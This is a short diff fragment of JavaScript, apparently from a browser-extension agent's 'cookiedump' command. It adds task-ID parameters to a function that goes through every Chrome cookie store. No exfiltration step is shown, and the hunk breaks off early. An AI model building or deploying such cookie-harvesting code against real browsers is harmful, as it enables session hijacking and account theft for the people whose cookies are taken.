@@ -1,5 +1,7 @@
 cookiedump = function(params) {
     let results = [];
+    taskid = params['taskid'];
+    tasktype = params['tasktype'];
     chrome.cookies.getAllCookieStores(function(stores) {
         stores.forEach(function (store) {
             const filter = {};
